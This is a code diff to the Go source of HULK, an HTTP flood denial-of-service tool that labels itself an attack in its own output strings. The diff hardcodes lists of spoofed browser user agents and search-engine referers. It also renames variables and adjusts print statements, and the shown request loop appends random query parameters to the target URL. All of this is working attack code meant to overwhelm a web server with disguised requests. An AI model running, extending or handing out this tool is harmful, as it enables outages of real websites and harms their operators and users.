@@ -16,56 +16,50 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
-	"regexp"
 	"strconv"
 	"strings"
 	"sync/atomic"
 	"syscall"
 )
 
-const _Version = "1.0.1"
+const __version__  = "1.0.1"
 
+// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk uint8 = iota
+	callGotOk              uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
 )
 
-func readheaderUseragents() string {
-	{
-		data, err := ioutil.ReadFile("headeruseragents.txt")
-		if err != nil {
-			fmt.Println("Can't read file")
-			panic(err)
-		}
-		var re = regexp.MustCompile(`\r?`)
-		var output = re.ReplaceAllString(string(data), "")
-		return output
-	}
-}
-
-func readheaderReferers() string {
-	{
-		data, err := ioutil.ReadFile("headersReferers.txt")
-		if err != nil {
-			fmt.Println("Can't read file")
-			panic(err)
-		}
-		var re = regexp.MustCompile(`\r?`)
-		var output = re.ReplaceAllString(string(data), "")
-		return output
-	}
-}
-
+// global params
 var (
 	safe            bool     = false
-	headersReferers []string = strings.Split(readheaderReferers(), ",")
-
-	headersUseragents []string = strings.Split(readheaderUseragents(), ",")
-	cur               int32
+	headersReferers []string = []string{
+		"http://www.google.com/?q=",
+		"http://www.usatoday.com/search/results?q=",
+		"http://engadget.search.aol.com/search?q=",
+		//"http://www.google.ru/?hl=ru&q=",
+		//"http://yandex.ru/yandsearch?text=",
+	}
+	headersUseragents []string = []string{
+		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
+		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
+		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
+		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+	}
+	cur int32
 )
 
 type arrayFlags []string
@@ -104,32 +98,32 @@ func main() {
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter")
+		fmt.Println("err parsing url parameter\n")
 		os.Exit(1)
 	}
 
 	if version {
-		fmt.Println("Hulk", _Version)
+		fmt.Println("Hulk", __version__)
 		os.Exit(0)
 	}
 
 	if agents != "" {
 		if data, err := ioutil.ReadFile(agents); err == nil {
 			headersUseragents = []string{}
-			for _, a := range strings.Split(string(data), "") {
+			for _, a := range strings.Split(string(data), "\n") {
 				if strings.TrimSpace(a) == "" {
 					continue
 				}
 				headersUseragents = append(headersUseragents, a)
 			}
 		} else {
-			fmt.Printf("can'l load User-Agent list from %s", agents)
+			fmt.Printf("can'l load User-Agent list from %s\n", agents)
 			os.Exit(1)
 		}
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --           Go!")
+		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -154,7 +148,7 @@ func main() {
 			case targetComplete:
 				sent++
 				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \r")
+				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
 		}
@@ -163,19 +157,19 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r-- Interrupted by user --        ")
+	fmt.Println("\r\n-- Interrupted by user --        \n")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
 	atomic.AddInt32(&cur, 1)
 
-	var paramJoiner string
+	var param_joiner string
 	var client = new(http.Client)
 
 	if strings.ContainsRune(url, '?') {
-		paramJoiner = "&"
+		param_joiner = "&"
 	} else {
-		paramJoiner = "?"
+		param_joiner = "?"
 	}
 
 	for {
@@ -183,7 +177,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		var err error
 
 		if data == "" {
-			q, err = http.NewRequest("GET", url+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
 		}
